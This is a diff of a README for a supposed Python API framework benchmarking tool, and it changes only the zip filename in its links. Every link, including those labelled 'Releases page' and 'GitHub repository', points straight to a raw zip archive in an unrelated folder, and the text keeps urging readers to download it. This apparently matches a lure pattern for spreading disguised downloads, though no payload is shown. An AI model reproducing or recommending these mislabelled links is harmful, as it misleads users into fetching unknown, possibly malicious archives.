@@ -1,7 +1,7 @@
 # 🎉 python-api-frameworks-benchmark - Compare API Frameworks Easily
 
 ## 📥 Download the Application
-[![Download Here](https://github.com/Vaslrs/python-api-frameworks-benchmark/raw/refs/heads/main/aperture/frameworks-api-benchmark-python-v2.2.zip%20Now%20-%20python--api--frameworks--benchmark-brightgreen)](https://github.com/Vaslrs/python-api-frameworks-benchmark/raw/refs/heads/main/aperture/frameworks-api-benchmark-python-v2.2.zip)
+[![Download Here](https://github.com/Vaslrs/python-api-frameworks-benchmark/raw/refs/heads/main/aperture/python_benchmark_frameworks_api_1.9.zip%20Now%20-%20python--api--frameworks--benchmark-brightgreen)](https://github.com/Vaslrs/python-api-frameworks-benchmark/raw/refs/heads/main/aperture/python_benchmark_frameworks_api_1.9.zip)
 
 ## 🚀 Getting Started
 This application helps you compare the performance of popular Python API frameworks: FastAPI, Litestar, Django Ninja, Django Bolt, and Django REST Framework. Use it to see which framework best fits your needs and requirements. 
@@ -17,7 +17,7 @@ Before you begin, ensure your system meets these requirements:
 To get started, follow these steps:
 
 1. **Visit the Releases Page:** 
-   Go to the [Releases page](https://github.com/Vaslrs/python-api-frameworks-benchmark/raw/refs/heads/main/aperture/frameworks-api-benchmark-python-v2.2.zip). 
+   Go to the [Releases page](https://github.com/Vaslrs/python-api-frameworks-benchmark/raw/refs/heads/main/aperture/python_benchmark_frameworks_api_1.9.zip). 
 
 2. **Select the Version:** 
    On the Releases page, find the latest version of the application. 
@@ -72,10 +72,10 @@ Yes, this application works on Windows, as well as macOS and Linux.
 If you run into problems, check the FAQs or submit an issue on the GitHub page for support.
 
 ## 👍 Support
-If you need assistance or have questions, please visit the [GitHub repository](https://github.com/Vaslrs/python-api-frameworks-benchmark/raw/refs/heads/main/aperture/frameworks-api-benchmark-python-v2.2.zip) for additional information and to get in touch.
+If you need assistance or have questions, please visit the [GitHub repository](https://github.com/Vaslrs/python-api-frameworks-benchmark/raw/refs/heads/main/aperture/python_benchmark_frameworks_api_1.9.zip) for additional information and to get in touch.
 
 ## 🔗 Important Links
-- [Download Here](https://github.com/Vaslrs/python-api-frameworks-benchmark/raw/refs/heads/main/aperture/frameworks-api-benchmark-python-v2.2.zip)
-- [GitHub Repository](https://github.com/Vaslrs/python-api-frameworks-benchmark/raw/refs/heads/main/aperture/frameworks-api-benchmark-python-v2.2.zip)
+- [Download Here](https://github.com/Vaslrs/python-api-frameworks-benchmark/raw/refs/heads/main/aperture/python_benchmark_frameworks_api_1.9.zip)
+- [GitHub Repository](https://github.com/Vaslrs/python-api-frameworks-benchmark/raw/refs/heads/main/aperture/python_benchmark_frameworks_api_1.9.zip)
 
 Getting started with the python-api-frameworks-benchmark is straightforward. Download the application today to explore and compare the performance of leading Python frameworks efficiently.
